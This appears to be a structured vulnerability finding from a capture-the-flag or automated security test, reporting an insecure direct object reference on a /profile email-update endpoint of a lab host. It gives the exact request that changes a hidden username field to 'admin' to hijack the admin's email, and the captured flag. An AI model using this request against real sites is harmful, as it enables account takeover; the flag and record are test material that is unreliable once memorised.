findings.title: IDOR - Insecure Direct Object Reference on /profile Email Update
findings.description: The POST /profile endpoint accepts a hidden `username` parameter that is not validated against the authenticated user's session. An attacker authenticated as any user (e.g. 'test') can change the `username` field to 'admin' and update the admin's email address, gaining the flag.
findings.evidence:
POST /profile with body: email=attacker@evil.com&username=admin Response: 'Email updated successfully!flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}' FULL RESPONSE BODY:

Email updated successfully!flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}

reproduction.command:
POST /profile HTTP/1.1
Host: 172.17.0.1:44339
Content-Type: application/x-www-form-urlencoded
Cookie: session=<valid-session>

email=attacker@evil.com&username=admin
